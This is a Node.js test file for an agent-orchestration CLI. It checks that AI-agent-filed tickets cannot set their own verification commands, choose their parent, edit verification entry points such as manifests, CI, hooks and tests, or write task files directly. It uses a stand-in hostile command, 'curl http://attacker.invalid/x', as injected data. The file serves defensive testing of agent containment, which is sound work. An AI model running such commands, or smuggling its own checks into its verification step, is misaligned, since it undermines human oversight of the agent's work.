import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { readdir } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

import { parseExtraJson, touchesVerificationEntryPoint } from "../dist/tickets.js";
import { initGitRepo, initProject, makeTask, quoteArg, REVIEW_NOTES_ARTIFACT, seedPlanReady, withEngine, withFakeAdapter } from "./helpers.js";

const skillsDir = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "skills");
const PARENT_CMD = `${quoteArg(process.execPath)} -e process.exit(0)`;
const HOSTILE_CMD = "curl http://attacker.invalid/x";

function seed(store) {
  return seedPlanReady(store, {
    task: {
      contract: {
        filesAllowed: ["src/main.ts"],
        expectedArtifacts: ["src/main.ts"],
        verificationCommands: [PARENT_CMD],
      },
    },
  });
}

function extraArtifact(body) {
  return [{ path: ".legion-cli/cache/runs/<id>/extra.json", content: JSON.stringify(body) }];
}

test("parseExtraJson never copies agent-supplied verificationCommands", () => {
  const [ticket] = parseExtraJson({ title: "t", verificationCommands: [HOSTILE_CMD] });
  assert.equal(ticket.contract.verificationCommands, undefined);
});

test("agent-filed ticket with a parent runs the parent's commands, not its own", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        const result = await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
        assert.equal(ticket.assignee, "agent");
        assert.equal(ticket.status, "ready", "no approval wait: the ticket is runnable");
        // The commands are surfaced to the caller (printed by the CLI).
        assert.deepEqual(result.tasks[0].filedTickets, [
          {
            id: "TSK-0002",
            verificationCommands: [PARENT_CMD],
            filesAllowed: ["notes/TSK-0002.md"],
            verificationSource: "running task",
          },
        ]);
        assert.match(ticket.notes, /filesAllowed outside TSK-0001's were replaced/);
      },
      {
        fakeArtifacts: [
          ...extraArtifact({
            title: "follow-up",
            parentId: "TSK-0001",
            filesAllowed: ["src/other.ts"],
            verificationCommands: [HOSTILE_CMD],
          }),
          { path: "src/main.ts", content: "export const ok = true;\n" },
        ],
      },
    );
  });
});

test("agent-filed ticket without a parent inherits the running task's commands", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        const result = await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
        assert.deepEqual(result.tasks[0].filedTickets?.[0]?.verificationCommands, [PARENT_CMD]);
      },
      {
        fakeArtifacts: [
          ...extraArtifact({ title: "orphan", filesAllowed: ["src/other.ts"], verificationCommands: [HOSTILE_CMD] }),
          { path: "src/main.ts", content: "export const ok = true;\n" },
        ],
      },
    );
  });
});

test("coerced agent ticket (overlapping filesAllowed) still inherits the parent's commands", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seed(store);
        initGitRepo(dir);
        await engine.execute("auto");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.filesAllowed, ["notes/TSK-0002.md"]);
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
      },
      {
        fakeArtifacts: extraArtifact({
          title: "overlap",
          parentId: "TSK-0001",
          filesAllowed: ["src/main.ts"],
          verificationCommands: [HOSTILE_CMD],
        }),
      },
    );
  });
});

test("human-filed ticket keeps the commands the human gave", async () => {
  await withEngine(async ({ engine, store }) => {
    await initProject(engine);
    await seed(store);
    const ticket = await engine.fileTicket({
      title: "human ticket",
      parentId: "TSK-0001",
      contract: { filesAllowed: ["src/human.ts"], verificationCommands: ["pnpm lint"] },
    });
    assert.deepEqual(ticket.contract.verificationCommands, ["pnpm lint"]);
  });
});

test("verify: a fix ticket from extra.json inherits the task's commands and reports them", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          phase: "executing",
          lastReview: "PASS",
          task: {
            status: "done",
            contract: {
              filesAllowed: ["src/main.ts"],
              expectedArtifacts: ["src/main.ts"],
              verificationCommands: [PARENT_CMD],
            },
          },
        });
        const result = await engine.verify("TSK-0001");
        assert.deepEqual(result.createdTaskIds, ["TSK-0002"], JSON.stringify(result));
        const child = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(child.contract.verificationCommands, [PARENT_CMD]);
        assert.deepEqual(result.createdTickets, [
          {
            id: "TSK-0002",
            verificationCommands: [PARENT_CMD],
            filesAllowed: ["notes/TSK-0002.md"],
            verificationSource: "verified task",
          },
        ]);
      },
      {
        skillsDir,
        fakeArtifacts: extraArtifact({
          title: "fix contrast",
          parentId: "TSK-0001",
          type: "fix",
          filesAllowed: ["src/fix.ts"],
          verificationCommands: [HOSTILE_CMD],
        }),
      },
    );
  });
});

test("agent ticket may touch files inside its source task's filesAllowed, not package.json", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, { phase: "executing", lastReview: "PASS", task: { status: "done" } });
        const result = await engine.verify("TSK-0001");
        assert.deepEqual((await store.readTask("TSK-0002")).data.contract.filesAllowed, ["src/main.ts"]);
        assert.deepEqual((await store.readTask("TSK-0003")).data.contract.filesAllowed, ["notes/TSK-0003.md"]);
        assert.equal(result.createdTickets.length, 2);
      },
      {
        skillsDir,
        fakeArtifacts: extraArtifact([
          { title: "same file", type: "fix", filesAllowed: ["src/main.ts"] },
          { title: "entry point", type: "fix", filesAllowed: ["package.json"] },
        ]),
      },
    );
  });
});

test("an agent-chosen parentId cannot pick which commands a ticket inherits during execute", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store, dir }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          task: {
            contract: { filesAllowed: ["src/main.ts"], expectedArtifacts: ["src/main.ts"], verificationCommands: [PARENT_CMD] },
          },
          extraTasks: [
            makeTask({
              id: "TSK-0002",
              title: "trivial",
              status: "done",
              contract: { filesAllowed: ["src/b.ts"], expectedArtifacts: ["src/b.ts"], verificationCommands: ["true"] },
            }),
          ],
        });
        initGitRepo(dir);
        const result = await engine.execute("TSK-0001");
        const ticket = (await store.readTask("TSK-0003")).data;
        assert.deepEqual(ticket.contract.verificationCommands, [PARENT_CMD]);
        assert.equal(result.tasks[0].filedTickets[0].verificationSource, "running task");
      },
      {
        fakeArtifacts: [
          ...extraArtifact({ title: "pick trivial parent", parentId: "TSK-0002" }),
          { path: "src/main.ts", content: "export const ok = true;\n" },
        ],
      },
    );
  });
});

test("a source task with no verification commands is reported as the engine default, not inherited", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          phase: "executing",
          lastReview: "PASS",
          task: {
            status: "done",
            contract: { filesAllowed: ["src/main.ts"], expectedArtifacts: ["src/main.ts"], verificationCommands: [] },
          },
        });
        const result = await engine.verify("TSK-0001");
        assert.equal(result.createdTickets[0].verificationSource, "engine default (pnpm test)");
        assert.deepEqual(result.createdTickets[0].verificationCommands, ["pnpm test"]);
      },
      { skillsDir, fakeArtifacts: extraArtifact({ title: "fix", parentId: "TSK-0001", type: "fix" }) },
    );
  });
});

test("an unresolvable agent parentId with no running task falls to the engine default", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, { phase: "executing", lastReview: "PASS", task: { status: "done" } });
        const result = await engine.verify();
        assert.equal(result.createdTickets[0].verificationSource, "engine default (pnpm test)");
      },
      { skillsDir, fakeArtifacts: extraArtifact({ title: "fix", parentId: "TSK-9999", type: "fix" }) },
    );
  });
});

// A-030 / R-1: settle empirically what happens to a TSK file a verify or review agent writes straight
// into tasks/. The engine restores tasks/ after a spawn, so it never becomes a ticket with its own commands.
for (const skill of ["verify", "review"]) {
  test(`${skill}: a task file written straight into tasks/ does not survive with its own commands`, async () => {
    await withFakeAdapter(async () => {
      await withEngine(
        async ({ engine, store, dir }) => {
          await initProject(engine);
          await seedPlanReady(store, { phase: "executing", lastReview: "PASS", task: { status: "done" } });
          let created = [];
          let refused;
          if (skill === "verify") {
            const result = await engine.verify("TSK-0001");
            assert.equal(result.spawned, true, "the verify agent actually ran");
            created = result.createdTaskIds;
          } else {
            try {
              created = (await engine.review()).createdTaskIds;
            } catch (err) {
              refused = err;
            }
          }
          const runs = (await readdir(join(dir, ".legion-cli", "cache", "runs"))).filter((n) => n.startsWith(`${skill}-`));
          assert.ok(runs.length >= 1, `the ${skill} agent actually ran (${refused?.message ?? "no refusal"})`);
          if (refused) assert.match(refused.message, /outside SkillContract|reverted/, "the only acceptable refusal is the revert one");
          // Evidence (Windows host, fake adapter through the real spawn/revert path): the file is removed
          // after the spawn, so it never becomes a task. If this starts failing, clamp created tasks like extra.json tickets.
          assert.equal(existsSync(join(dir, ".legion-cli", "tasks", "TSK-0002.md")), false);
          assert.deepEqual(created, []);
        },
        {
          skillsDir,
          fakeArtifacts: [
            { path: ".legion-cli/tasks/TSK-0002.md", content: directTaskMarkdown("TSK-0002", "TSK-0001", HOSTILE_CMD) },
            // A review that really ran leaves notes (PR 2's evidence rule); without them it would be refused for that reason instead.
            ...(skill === "review" ? [REVIEW_NOTES_ARTIFACT] : []),
          ],
        },
      );
    });
  });
}

function directTaskMarkdown(id, parentId, cmd) {
  return [
    "---",
    "schemaVersion: legion-cli-task/v1",
    `id: ${id}`,
    "title: agent wrote this directly",
    "status: ready",
    "type: fix",
    "priority: P2",
    "specId: spec-checkin",
    ...(parentId ? [`parentId: ${parentId}`] : []),
    "blockedBy: []",
    "blocks: []",
    "contract:",
    "  filesAllowed:",
    "    - package.json",
    "  filesForbidden:",
    "    - .git/**",
    "  expectedArtifacts:",
    "    - package.json",
    "  verificationCommands:",
    `    - ${JSON.stringify(cmd)}`,
    "assignee: agent",
    'notes: ""',
    "---",
    "",
    "agent wrote this directly.",
    "",
  ].join("\n");
}

test("touchesVerificationEntryPoint flags manifests, configs, scripts, CI, hooks, tests and command-referenced files", () => {
  for (const path of [
    "package.json", "PACKAGE.JSON", "./package.json", "pnpm-lock.yaml", "sub/package.json", "Makefile",
    "scripts/check.js", ".github/workflows/ci.yml", ".husky/pre-commit", ".githooks/pre-push",
    "vitest.config.ts", "jest.config.js", "tsconfig.json", "tsconfig.build.json", "eslint.config.mjs",
    "test/a.js", "packages/x/tests/a.js", "src/a.test.ts", "src/a.spec.js", "conftest.py",
  ]) {
    assert.equal(touchesVerificationEntryPoint([path]), true, path);
  }
  assert.equal(touchesVerificationEntryPoint(["src/app.ts", "notes/TSK-0002.md", "docs/readme.md"]), false);
  assert.equal(touchesVerificationEntryPoint(["tools/run.sh"], ["bash tools/run.sh --all"]), true, "named by a command");
  assert.equal(touchesVerificationEntryPoint(["tools/other.sh"], ["bash tools/run.sh"]), false);
});

test("verify: an agent ticket inside the verified task's files is still coerced when it is a verification entry point", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          phase: "executing",
          lastReview: "PASS",
          task: {
            status: "done",
            contract: {
              filesAllowed: ["src/main.ts", "package.json"],
              expectedArtifacts: ["src/main.ts"],
              verificationCommands: [PARENT_CMD],
            },
          },
        });
        const result = await engine.verify("TSK-0001");
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.deepEqual(ticket.contract.filesAllowed, ["notes/TSK-0002.md"]);
        assert.match(ticket.notes, /verification entry point/);
        assert.deepEqual(result.createdTickets[0].filesAllowed, ["notes/TSK-0002.md"]);
      },
      { skillsDir, fakeArtifacts: extraArtifact({ title: "edit manifest", type: "fix", filesAllowed: ["package.json"] }) },
    );
  });
});

test("review: an agent ticket cannot pick its parent or its files; default commands and notes/ contract, printed with the true source", async () => {
  await withFakeAdapter(async () => {
    await withEngine(
      async ({ engine, store }) => {
        await initProject(engine);
        await seedPlanReady(store, {
          phase: "executing",
          lastReview: "PASS",
          task: {
            status: "done",
            contract: {
              filesAllowed: ["package.json"],
              expectedArtifacts: ["package.json"],
              verificationCommands: [PARENT_CMD],
            },
          },
        });
        const result = await engine.review();
        assert.deepEqual(result.createdTaskIds, ["TSK-0002"]);
        const ticket = (await store.readTask("TSK-0002")).data;
        assert.equal(ticket.parentId, undefined, "agent parentId ignored");
        assert.deepEqual(ticket.contract.filesAllowed, ["notes/TSK-0002.md"]);
        assert.deepEqual(ticket.contract.verificationCommands, ["pnpm test"]);
        assert.deepEqual(result.createdTickets, [
          {
            id: "TSK-0002",
            verificationCommands: ["pnpm test"],
            filesAllowed: ["notes/TSK-0002.md"],
            verificationSource: "engine default (pnpm test)",
          },
        ]);
      },
      {
        skillsDir,
        fakeArtifacts: extraArtifact({
          title: "rewrite the test entry",
          parentId: "TSK-0001",
          type: "fix",
          filesAllowed: ["package.json"],
          verificationCommands: [HOSTILE_CMD],
        }),
      },
    );
  });
});

test("touchesVerificationEntryPoint sees through NTFS aliases (trailing dots/spaces, case, streams)", () => {
  for (const path of [
    "package.json.", "package.json ", "package.json. .", "PACKAGE.JSON", "package.json:stream",
    "scripts./x.js", "Scripts /x.js", "SCRIPTS/x.js", ".GitHub./workflows/ci.yml", "sub/Package.JSON.",
  ]) {
    assert.equal(touchesVerificationEntryPoint([path]), true, JSON.stringify(path));
  }
  // command tokens are normalised the same way
  assert.equal(touchesVerificationEntryPoint(["tools/Run.sh."], ["bash tools/run.sh"]), true);
  assert.equal(touchesVerificationEntryPoint(["tools/run.sh"], ["bash Tools/RUN.sh ."]), true);
});

test("touchesVerificationEntryPoint covers other ecosystems' manifests and configs", () => {
  for (const path of [
    "bunfig.toml", ".swcrc", "next.config.mjs", "CMakeLists.txt", "app/App.csproj", "App.sln", "deno.json",
    "pyproject.toml", "Cargo.toml", "go.mod", "pom.xml", "build.gradle", "build.gradle.kts", "setup.py",
    "requirements.txt", "requirements-dev.txt", "Gemfile", "composer.json", "x/lib.gemspec",
  ]) {
    assert.equal(touchesVerificationEntryPoint([path]), true, path);
  }
  assert.equal(touchesVerificationEntryPoint(["src/main.ts", "docs/requirements.md"]), false);
});
